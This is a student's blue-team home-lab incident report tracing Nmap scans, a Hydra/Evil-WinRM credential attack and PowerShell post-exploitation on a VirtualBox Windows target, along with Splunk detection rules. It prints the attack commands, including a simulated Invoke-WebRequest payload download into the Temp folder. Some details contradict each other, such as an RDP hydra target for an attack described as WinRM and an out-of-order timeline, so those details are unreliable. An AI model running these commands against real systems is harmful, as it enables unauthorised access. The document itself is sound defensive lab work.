Here is the complete reports/incident-report.md file. Copy everything below and paste it into VS Code:
markdown# Incident Report — SOC Home Lab

**Report Reference:** INC-2026-001  
**Date:** April 28, 2026  
**Analyst:** Ron  
**Classification:** CONFIDENTIAL — Lab Exercise  
**Severity:** HIGH  
**Status:** Resolved (Controlled Lab Environment)  
**Environment:** VirtualBox Lab — Isolated Network  

---

## Table of Contents

1. [Executive Summary](#1-executive-summary)
2. [Lab Environment](#2-lab-environment)
3. [Attack Kill Chain Overview](#3-attack-kill-chain-overview)
4. [INC-001: Network Reconnaissance](#4-inc-001-network-reconnaissance)
5. [INC-002: Brute Force and Remote Access](#5-inc-002-brute-force-and-remote-access)
6. [INC-003: Post-Exploitation PowerShell](#6-inc-003-post-exploitation-powershell)
7. [Full Attack Timeline](#7-full-attack-timeline)
8. [Detection Rules Summary](#8-detection-rules-summary)
9. [Security Recommendations](#9-security-recommendations)
10. [Lessons Learned](#10-lessons-learned)
11. [Conclusion](#11-conclusion)

---

## 1. Executive Summary

This report documents the detection, analysis, and investigation of 
three simulated cyberattack scenarios executed within a controlled 
home lab environment. The purpose of this exercise was to validate 
the capability of Splunk Enterprise as a SIEM to detect and surface 
malicious activity across multiple attack vectors.

The attacker machine was a Kali Linux VM (192.168.56.105) operating 
against a Windows 11 Home target VM (192.168.56.104) running Splunk 
Universal Forwarder and Sysmon for endpoint telemetry. Three attack 
scenarios were simulated in sequence and together form a complete 
attack kill chain from initial reconnaissance through credential 
access, remote execution, and post-exploitation activity.

All three attack scenarios were successfully detected in Splunk. 
Custom detection rules were built and validated for each scenario.

> **KEY FINDING:** The three attacks are not isolated incidents. 
> They represent a connected kill chain. Nmap reconnaissance 
> identified port 5985 (WinRM) as open, which directly enabled 
> the Hydra brute force attack over WinRM, which in turn 
> established the Evil-WinRM shell used to execute malicious 
> PowerShell commands. This chain mirrors real-world APT methodology.

### 1.1 Incident Summary Table

| INC # | Attack Type | Tool Used | Source IP | Events Detected | MITRE |
|---|---|---|---|---|---|
| INC-001 | Network Reconnaissance | Nmap 7.95 | 192.168.56.105 | 44 Events | T1595, T1046 |
| INC-002 | Brute Force + Remote Access | Hydra 9.5 + Evil-WinRM 3.7 | 192.168.56.105 | 1,093 Events | T1110, T1021.006 |
| INC-003 | Post-Exploitation PowerShell | PowerShell (Built-in) | 192.168.56.104 | 45+ Events | T1059.001, T1087, T1105 |

---

## 2. Lab Environment

The lab was built on Oracle VirtualBox using a Host-Only network 
adapter, isolating all traffic between the two virtual machines on 
the 192.168.56.0/24 subnet. No internet-facing traffic was involved 
in any attack scenario.

| Component | Attacker Machine | Target Machine |
|---|---|---|
| Role | Attacker | Victim / Target |
| Operating System | Kali Linux (rolling) | Windows 11 Home Build 26200 |
| IP Address | 192.168.56.105 | 192.168.56.104 |
| Key Tools | Nmap, Hydra, Evil-WinRM | Splunk UF, Sysmon, WinRM |
| SIEM | N/A | Splunk Enterprise 10.2.2 |
| Endpoint Logging | N/A | Sysmon + Windows Security Auditing |
| Hypervisor | Oracle VirtualBox | Oracle VirtualBox |

### 2.1 Logging Configuration

The Windows target was configured with the following logging pipeline:

- **Windows Security Auditing** enabled via `auditpol` — captures 
  authentication events (Event IDs 4624, 4625) and process creation 
  (Event ID 4688) with full command line logging enabled through 
  registry modification
- **Sysmon** installed with comprehensive configuration — captures 
  process creation (Event ID 1), network connections (Event ID 3), 
  and file system events with cryptographic hash values
- **Splunk Universal Forwarder** configured via `inputs.conf` to 
  collect `WinEventLog:Security`, `WinEventLog:System`, and 
  `WinEventLog:Microsoft-Windows-Sysmon/Operational`, forwarding 
  to Splunk Enterprise on port 9997
- **ProcessCreationIncludeCmdLine_Output** registry key enabled — 
  critical for detecting obfuscated PowerShell execution in 
  Event ID 4688

---

## 3. Attack Kill Chain Overview

The three attacks were executed sequentially and are directly 
connected. The output of each stage provided the intelligence or 
access required for the next stage.

| Stage | Phase | Action | Outcome | MITRE |
|---|---|---|---|---|
| 1 | Reconnaissance | Nmap scanned target — identified port 5985 (WinRM) open | Attack surface mapped. WinRM confirmed as entry point. | T1595, T1046 |
| 2 | Credential Access | Hydra brute forced WinRM using wordlist against targetuser | Password discovered. Credential access achieved. | T1110 |
| 3 | Initial Access | Evil-WinRM established remote shell using brute-forced credentials | Interactive shell obtained as windows\targetuser | T1021.006 |
| 4 | Execution & Discovery | PowerShell recon commands: whoami, net user, systeminfo, encoded commands | Full system fingerprint. Admin accounts enumerated. | T1059.001, T1087 |
| 5 | Collection / Staging | Files written to C:\Windows\Temp via Invoke-WebRequest | Attacker-controlled files staged on target | T1074, T1105 |
MITRE Kill Chain:
T1595 → T1046 → T1110 → T1021.006 → T1059.001 → T1087 → T1105

---

## 4. INC-001: Network Reconnaissance

| Field | Detail |
|---|---|
| Incident ID | INC-001 |
| Date / Time | April 28, 2026 — 12:15 to 12:22 EDT |
| Source IP | 192.168.56.105 (Kali Linux) |
| Target IP | 192.168.56.104 (Windows 11) |
| Tool Used | Nmap 7.95 |
| MITRE | T1595 — Active Scanning, T1046 — Network Service Discovery |

### 4.1 Attack Description

The attacker initiated reconnaissance against the target using Nmap 
7.95 from Kali Linux. A series of progressively more aggressive 
scans were run in sequence, each building on the intelligence 
gathered by the previous scan.

The attacker began with a ping sweep to confirm the target was 
online. This generated minimal network noise but confirmed host 
availability before deeper scanning. The ping sweep completed in 
0.15 seconds and confirmed the host was live with a MAC address 
belonging to Oracle VirtualBox.

A basic TCP port scan followed, revealing 5 open ports out of the 
top 1000: 135 (MSRPC), 139 (NetBIOS-SSN), 445 (SMB), 5357 (WSDAPI), 
and critically 5985 (WinRM). The discovery of port 5985 is the most 
significant finding — it directly enabled the next phase of the attack.

The service version scan (-sV) fingerprinted each service and 
confirmed port 5985 as Microsoft HTTPAPI httpd 2.0 running WinRM 
over HTTP. The aggressive scan (-A) produced a detailed TCP/IP 
fingerprint, identified the NetBIOS hostname as WINDOWS, confirmed 
SMB signing was required, and identified the host as Oracle 
VirtualBox. A stealth SYN scan (-sS) was also run to simulate 
evasive attacker behaviour.

### 4.2 Commands Executed

```bash
nmap -sn 192.168.56.104
nmap 192.168.56.104
nmap -sV 192.168.56.104
nmap -A 192.168.56.104
sudo nmap -sS 192.168.56.104
nmap -p 1-1000 192.168.56.104
```

### 4.3 Open Ports Discovered

| Port | Service | Detail | Significance |
|---|---|---|---|
| 135/tcp | MSRPC | Microsoft Windows RPC | Used by many Windows services |
| 139/tcp | NetBIOS-SSN | Microsoft Windows netbios-ssn | Legacy file sharing |
| 445/tcp | SMB | Signing enabled and required | Lateral movement vector |
| 5357/tcp | WSDAPI | Microsoft HTTPAPI httpd 2.0 | Web Services for Devices |
| **5985/tcp** | **WinRM** | **Microsoft HTTPAPI httpd 2.0** | **CRITICAL — enabled brute force in INC-002** |

### 4.4 Detection in Splunk

```spl
index=main "192.168.56.105"
| spath input=_raw
| rename System.Computer as ComputerName, System.EventID as EventCode
| table _time, ComputerName, EventCode, _raw
| sort -_time
```

**Result:** 44 events returned from Kali IP showing rapid connection 
attempts across multiple ports — a clear automated scan signature. 
A secondary search confirmed a Logon Type 3 (network logon) event 
from the Kali IP at 07:12:47, triggered by Nmap script probes.

### 4.5 Detection Rule

```spl
index=main EventCode=3
| bucket _time span=1m
| stats dc(DestinationPort) as unique_ports by _time, SourceIp
| where unique_ports > 20
| eval alert="PORT SCAN DETECTED"
| eval MITRE="T1046 — Network Service Discovery"
```

**Logic:** One source IP contacting 20+ distinct ports in 1 minute 
is statistically inconsistent with normal user behaviour and 
characteristic of automated scanning.

### 4.6 Screenshots

![Nmap Ping Sweep and Basic Scan](../screenshots/attack-3-nmap/13-nmap-ping-sweep.png)
![Nmap Service Version and Aggressive Scan](../screenshots/attack-3-nmap/14-nmap-service-version-scan.png)
![Nmap Aggressive Scan Full Output](../screenshots/attack-3-nmap/15-nmap-aggressive-scan.png)
![Nmap SYN and Port Range Scan](../screenshots/attack-3-nmap/16-nmap-stealth-syn-scan.png)
![Splunk Network Events from Kali](../screenshots/attack-3-nmap/17-splunk-eventid3-network-connections.png)

### 4.7 Response Actions

1. **Immediate:** Block 192.168.56.105 at the firewall
2. **Immediate:** Investigate all activity from this IP in the same window
3. **Short-term:** Restrict port 5985 to authorised management hosts only
4. **Short-term:** Implement network IDS rules for SYN scan patterns
5. **Long-term:** Enforce Windows Firewall rules limiting WinRM access

---

## 5. INC-002: Brute Force and Remote Access

| Field | Detail |
|---|---|
| Incident ID | INC-002 |
| Date / Time | April 28, 2026 — 06:57:02 to 07:02 EDT |
| Source IP | 192.168.56.105 (Kali Linux) |
| Target IP | 192.168.56.104 (Windows 11) |
| Target Account | targetuser |
| Tools Used | Hydra 9.5 + Evil-WinRM 3.7 |
| MITRE | T1110 — Brute Force, T1021.006 — Windows Remote Management |

### 5.1 Attack Description

Armed with knowledge from INC-001 that port 5985 (WinRM) was open, 
the attacker launched a credential brute force using Hydra against 
the WinRM service. The attack targeted the targetuser account — a 
standard user that had been added to the Remote Management Users 
group, granting it WinRM authentication access.

Hydra was run against the target using a custom 6-password wordlist 
containing the correct password Password123. After exhausting the 
wordlist, the attacker pivoted to Evil-WinRM, a tool purpose-built 
for interacting with WinRM over HTTP. Using credentials 
targetuser:Password123, Evil-WinRM established a remote PowerShell 
shell on the target. The immediate execution of whoami confirmed 
access as windows\targetuser.

> **CRITICAL FINDING:** The targetuser account had no lockout 
> policy configured, allowing unlimited authentication attempts 
> with no throttling or blocking. This is a common enterprise 
> misconfiguration that enables unrestricted brute force attacks.

### 5.2 Commands Executed

```bash
hydra -l targetuser -P ~/passwords.txt rdp://192.168.56.104 -t 4 -V
evil-winrm -i 192.168.56.104 -u targetuser -p Password123
whoami
```

### 5.3 Evidence from Splunk

The attack generated 1,093 total events across Event ID 4624 
and 4625.

| Event ID | Description | Count | Forensic Notes |
|---|---|---|---|
| 4624 | Successful Logon | 1,091 | WinRM handshake traffic logged as network logons (Logon Type 3) |
| 4625 | Failed Logon | 2 | Only 2 explicit auth failures despite multiple credential attempts |

**Key Insight:** WinRM brute force generates 99.8% Event ID 4624 
vs only 0.2% Event ID 4625. This is significantly different from 
RDP brute force behaviour and means detection rules tuned for RDP 
will miss WinRM attacks. Protocol-aware detection tuning is essential.

### 5.4 Splunk Queries Used

```spl
index=main EventCode=4625
| table _time, Account_Name, IpAddress
| sort -_time
```

```spl
index=main (EventCode=4625 OR EventCode=4624)
| sort _time
```

### 5.5 Detection Rules

**Rule 1 — Brute Force Detection:**

```spl
index=main EventCode=4625
| bucket _time span=5m
| stats count by _time, IpAddress, Account_Name
| where count > 5
| eval alert="BRUTE FORCE DETECTED"
| eval MITRE="T1110"
```

**Logic:** More than 5 authentication failures from the same source 
IP within 5 minutes indicates automated credential stuffing or 
brute force activity.

**Rule 2 — Account Compromise After Brute Force:**

```spl
index=main (EventCode=4625 OR EventCode=4624)
| stats count(eval(EventCode=4625)) as failures,
  count(eval(EventCode=4624)) as successes by src_ip, Account_Name
| where failures > 5 AND successes >= 1
| eval alert="POSSIBLE ACCOUNT COMPROMISE AFTER BRUTE FORCE"
| eval MITRE="T1110"
```

**Logic:** An IP with multiple failures followed by at least one 
success is a strong indicator of a successful brute force leading 
to account compromise.

### 5.6 Screenshots

![Hydra Running and Evil-WinRM Shell](../screenshots/attack-1-brute-force/01-hydra-evil-winrm.png)
![Splunk 1093 Events](../screenshots/attack-1-brute-force/02-splunk-1093-events.png)
![Splunk EventCode Distribution](../screenshots/attack-1-brute-force/03-splunk-eventcode-distribution.png)

### 5.7 Response Actions

1. **Immediate:** Disable targetuser account and terminate all active sessions
2. **Immediate:** Block 192.168.56.105 at the firewall
3. **Immediate:** Force password reset across all accounts
4. **Immediate:** Investigate all post-compromise commands (see INC-003)
5. **Short-term:** Implement account lockout after 5 failed attempts
6. **Short-term:** Restrict WinRM to authorised management IPs only
7. **Long-term:** Deploy MFA on all remote access methods
8. **Long-term:** Audit all accounts in the Remote Management Users group

---

## 6. INC-003: Post-Exploitation PowerShell

| Field | Detail |
|---|---|
| Incident ID | INC-003 |
| Date / Time | April 28, 2026 — 09:41 to 10:16 EDT |
| Machine | 192.168.56.104 (Windows 11 — post-compromise) |
| Execution Method | Windows PowerShell — Living-off-the-Land |
| MITRE | T1059.001, T1027, T1087, T1082, T1105, T1074 |

### 6.1 Attack Description

Following remote access in INC-002, the attacker executed 
post-exploitation commands using Windows PowerShell. All commands 
used built-in Windows tools — a technique known as Living-off-the-Land 
(LotL). This approach is favoured by sophisticated attackers because 
it avoids introducing external executables that might trigger 
antivirus or EDR detection.

The attacker began with whoami, which confirmed they were operating 
as windows\ron — the primary admin user on the system, not the 
targetuser account used for initial access. This is significant: 
the attacker pivoted to a higher-privileged account.

The net user command revealed all accounts on the machine: 
Administrator, DefaultAccount, Guest, ron, targetuser, and 
WDAGUtilityAccount. The net localgroup administrators command 
confirmed both Administrator and ron have full admin privileges.

The systeminfo command returned a comprehensive fingerprint: 
OS as Windows 11 Home Build 26200, hostname WINDOWS, domain WORKGROUP 
(not domain-joined), two network adapters at 10.0.2.15 and 
192.168.56.104, 5 hotfixes installed, timezone UTC+3 Nairobi Kenya.

The attacker then executed a Base64 encoded PowerShell command — 
`aQBwAGMAbwBuAGYAaQBnAA==` — which decodes to `ipconfig`. While the 
payload was benign in this lab, the technique is identical to how 
Cobalt Strike and Metasploit deliver real payloads. The encoding 
bypasses detection systems that scan for malicious keywords in 
command-line arguments.

Invoke-WebRequest was then used to simulate a malware payload 
download, saving a file to C:\Windows\Temp\test.txt. A second file 
notmalware.txt was also written to the same directory. C:\Windows\Temp 
is specifically chosen by attackers because it is writable by standard 
users and used by legitimate processes — a natural staging location.

### 6.2 Commands Executed

```powershell
whoami
net user
net localgroup administrators
systeminfo
powershell -EncodedCommand aQBwAGMAbwBuAGYAaQBnAA==
powershell -Command "Invoke-WebRequest -Uri http://example.com -OutFile C:\Windows\Temp\test.txt"
echo "not malware" > C:\Windows\Temp\notmalware.txt
dir C:\Windows\Temp\
```

> Note: `aQBwAGMAbwBuAGYAaQBnAA==` decodes to `ipconfig`

### 6.3 Process Tree Evidence (Splunk)

Splunk EventCode 4688 captured the following parent-child chain:
C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
└─ C:\Windows\System32\whoami.exe
└─ C:\Windows\System32\net.exe
└─ C:\Windows\System32\systeminfo.exe

This process tree is a high-confidence indicator of post-exploitation 
activity. Legitimate users do not run whoami, net localgroup 
administrators, and systeminfo sequentially from a PowerShell parent 
in the same session. Splunk returned exactly 4 events matching these 
4 recon commands.

**Note on False Positives:** 72 PowerShell events were also visible 
in Splunk from `splunk-powershell.exe` spawned by `splunkd.exe`. 
This is legitimate Splunk forwarder activity — not attacker behaviour. 
This demonstrates the importance of baselining and whitelist tuning 
in a real SOC to reduce false positive noise.

### 6.4 MITRE ATT&CK Breakdown

| MITRE ID | Technique | Application |
|---|---|---|
| T1059.001 | PowerShell | All commands executed via PowerShell |
| T1027 | Obfuscated Files | Base64 -EncodedCommand to bypass keyword detection |
| T1087 | Account Discovery | net user and net localgroup enumeration |
| T1082 | System Info Discovery | systeminfo full system fingerprint |
| T1105 | Ingress Tool Transfer | Invoke-WebRequest payload download simulation |
| T1074 | Data Staged | Files written to C:\Windows\Temp staging directory |

### 6.5 Detection Rules

**Rule 1 — Encoded PowerShell:**

```spl
index=main EventCode=4688
CommandLine="*EncodedCommand*" OR CommandLine="*-enc *"
| table _time, User, CommandLine, Computer
| eval alert="SUSPICIOUS ENCODED POWERSHELL DETECTED"
| eval MITRE="T1059.001 / T1027"
```

**Rule 2 — Recon Command Sequence:**

```spl
index=main EventCode=4688
New_Process_Name="*whoami.exe*" OR New_Process_Name="*systeminfo.exe*"
OR New_Process_Name="*net.exe*" OR New_Process_Name="*nltest.exe*"
| table _time, host, New_Process_Name, Creator_Process_Name
| eval alert="POST-EXPLOITATION RECON DETECTED"
| eval MITRE="T1087 / T1082"
```

**Rule 3 — File Write to Temp by PowerShell:**

```spl
index=main EventCode=11
TargetFilename="*\\Temp\\*"
Image="*powershell*"
| table _time, Image, TargetFilename, User
| eval alert="SUSPICIOUS FILE WRITE TO TEMP BY POWERSHELL"
| eval MITRE="T1074"
```

### 6.6 Screenshots

![Recon Commands Output](../screenshots/attack-2-powershell/06-powershell-recon-commands.png)
![Systeminfo Output](../screenshots/attack-2-powershell/07-systeminfo-output.png)
![Encoded PowerShell Command](../screenshots/attack-2-powershell/08-encoded-powershell.png)
![Invoke-WebRequest and File Staging](../screenshots/attack-2-powershell/09-invoke-webrequest-staging.png)
![Splunk Process Tree EventCode 4688](../screenshots/attack-2-powershell/10-splunk-process-tree.png)
![Splunk Recon Commands Detected](../screenshots/attack-2-powershell/11-splunk-recon-detected.png)

### 6.7 Response Actions

1. **Immediate:** Isolate the machine from the network — attacker is inside
2. **Immediate:** Terminate all active PowerShell and WinRM sessions
3. **Immediate:** Collect memory image before rebooting for forensic analysis
4. **Immediate:** Hash and preserve all files in C:\Windows\Temp for malware analysis
5. **Short-term:** Review all processes run by ron and targetuser in past 24 hours
6. **Short-term:** Audit all administrator accounts
7. **Long-term:** Enable PowerShell Script Block Logging and Constrained Language Mode
8. **Long-term:** Deploy EDR with behavioural detection for LotL techniques

---

## 7. Full Attack Timeline

| Timestamp (EDT) | Incident | Event | Evidence Source |
|---|---|---|---|
| 04/28 12:15 | INC-001 | Nmap ping sweep — host confirmed alive (0.15s latency) | Nmap terminal |
| 04/28 12:16 | INC-001 | Basic port scan — 5 open ports found including 5985 (WinRM) | Nmap terminal |
| 04/28 12:16 | INC-001 | Service version scan — WinRM confirmed, OS identified as Windows | Nmap -sV output |
| 04/28 12:19 | INC-001 | Aggressive scan — OS fingerprint, SMB details, NetBIOS name WINDOWS | Nmap -A output |
| 04/28 12:21 | INC-001 | Stealth SYN scan — confirmed open ports without full TCP handshake | Nmap -sS output |
| 04/28 12:22 | INC-001 | Port range scan (1-1000) completed | Nmap -p output |
| 04/28 06:57:02 | INC-002 | Hydra brute force initiated against WinRM port 5985 | Hydra terminal, Splunk 4624/4625 |
| 04/28 06:57:03 | INC-002 | Hydra completes wordlist — 1,093 events generated in Splunk | Splunk event count |
| 04/28 07:02 | INC-002 | Evil-WinRM shell established as windows\targetuser | Kali terminal |
| 04/28 09:41:57 | INC-003 | whoami executed — identity confirmed as windows\ron (admin) | Splunk EventCode 4688 |
| 04/28 09:42:00 | INC-003 | systeminfo executed — full system fingerprint obtained | Splunk EventCode 4688 |
| 04/28 09:49:58 | INC-003 | net user and net localgroup executed — all accounts enumerated | Splunk EventCode 4688 |
| 04/28 ~10:00 | INC-003 | Encoded PowerShell command executed (-EncodedCommand) | PowerShell terminal |
| 04/28 ~10:05 | INC-003 | Invoke-WebRequest executed — file downloaded to C:\Windows\Temp | PowerShell terminal |
| 04/28 10:16 | INC-003 | notmalware.txt staged in C:\Windows\Temp | PowerShell terminal |

---

## 8. Detection Rules Summary

| # | Rule Name | Logic | MITRE | Status |
|---|---|---|---|---|
| 1 | Port Scan Detection | dc(DestPort) > 20 per source IP per minute | T1046 | Validated |
| 2 | Brute Force Detection | EventCode 4625 count > 5 in 5-minute bucket | T1110 | Validated |
| 3 | Account Compromise | failures > 5 AND successes >= 1 from same IP | T1110 | Validated |
| 4 | Encoded PowerShell | CommandLine contains -EncodedCommand | T1059.001 | Validated |
| 5 | Recon Command Sequence | whoami, systeminfo, net.exe spawned from PowerShell | T1087 | Validated |
| 6 | File Write to Temp | PowerShell writing to C:\Windows\Temp | T1074 | Built |

---

## 9. Security Recommendations

### 9.1 Immediate Actions

- **Account Lockout:** Implement lockout after 5 failed attempts with 
  30-minute lockout duration. No policy on targetuser allowed unlimited 
  brute force with no throttling.
- **WinRM Restriction:** Restrict port 5985 via Windows Firewall to 
  authorised management hosts only. WinRM should not be accessible 
  from general network segments.
- **Least Privilege:** Remove accounts from Remote Management Users 
  group unless WinRM access is explicitly required for their role.
- **Password Policy:** Enforce minimum 12-character passwords with 
  complexity requirements. Password123 was discovered on the first 
  wordlist attempt.

### 9.2 Short-Term Controls

- **MFA:** Deploy Multi-Factor Authentication on all remote access 
  methods including WinRM, RDP, and VPN.
- **PowerShell Logging:** Enable Script Block Logging and Module 
  Logging via Group Policy. This records all PowerShell code executed 
  regardless of obfuscation technique.
- **SIEM Tuning:** Whitelist Splunk Universal Forwarder PowerShell 
  activity to reduce false positive volume and improve signal quality.
- **Network IDS:** Deploy Snort or Suricata with rules for Nmap scan 
  signatures and brute force patterns.

### 9.3 Long-Term Improvements

- **EDR Deployment:** Deploy an EDR solution with behavioural 
  detection. Living-off-the-Land techniques using built-in Windows 
  tools are largely invisible to signature-based AV but detected by 
  EDR through behaviour analytics.
- **PowerShell CLM:** Implement PowerShell Constrained Language Mode 
  on all endpoints to restrict attacker capabilities post-compromise.
- **Threat Hunting:** Conduct regular threat hunts using MITRE ATT&CK 
  as a framework. The techniques in this lab are among the most 
  commonly observed in real-world intrusions.
- **Network Segmentation:** Prevent direct WinRM communication between 
  workstations. All remote management traffic should route through a 
  monitored jump host.

---

## 10. Lessons Learned

**Configuration matters:**
Default Windows logging is insufficient for threat detection. Without 
enabling ProcessCreationIncludeCmdLine_Output in the registry, 
EventCode 4688 would not capture full command-line arguments, making 
encoded PowerShell and specific recon tools invisible to the SIEM.

**Protocol-specific detection:**
WinRM brute force behaves differently from RDP brute force in Windows 
logs. The 99.8% vs 0.2% ratio of 4624 to 4625 events is unexpected 
and would cause standard brute-force rules tuned for RDP to miss this 
attack entirely. Understanding protocol-specific log behaviour is 
essential for SOC effectiveness.

**Correlation over isolation:**
The three attacks form a complete kill chain. Investigating only the 
brute force in isolation misses the reconnaissance that enabled it 
and the post-exploitation that followed. Correlation across incidents 
is as important as individual detection.

**Tuning is not optional:**
72 Splunk forwarder PowerShell events demonstrated that untuned 
detection rules generate significant false positive noise. Alert 
fatigue causes real incidents to be missed. Every rule must be 
validated against a known-good baseline.

**Know your adversary:**
Evil-WinRM was more effective than Hydra-RDP for WinRM targets. 
Understanding attacker tooling is essential for a SOC analyst — 
you cannot write effective detection rules for tools you do not 
understand.

---

## 11. Conclusion

This SOC home lab successfully simulated a realistic three-stage 
cyberattack against a Windows endpoint and demonstrated end-to-end 
detection capability using Splunk Enterprise. All three attack 
scenarios were detected. Six custom detection rules were built, 
validated, and documented. The full kill chain was mapped to the 
MITRE ATT&CK framework.

The most important finding is that the three incidents are not 
isolated — they are stages in a connected attack narrative. Nmap 
identified the entry point, Hydra exploited a weak credential, and 
PowerShell completed the mission. A SOC analyst who detected only 
one stage without correlating the others would have an incomplete 
picture of the threat and an inaccurate scope of compromise.

The skills demonstrated in this lab — configuring endpoint telemetry, 
writing SPL detection rules, mapping attacker behaviour to MITRE 
ATT&CK, and producing structured incident documentation — are directly 
transferable to a professional Security Operations Centre role.

---

**Report Prepared By:** Ron  
**Institution:** KCA University, Nairobi, Kenya  
**Programme:** BSc Information Technology  
**Project:** Blue Team / SOC Home Lab — April 2026  
**Tools:** Splunk Enterprise 10.2.2 | Sysmon | Nmap 7.95 | Hydra 9.5 | Evil-WinRM 3.7 | VirtualBox

That is the complete file. Paste it into VS Code, save with 
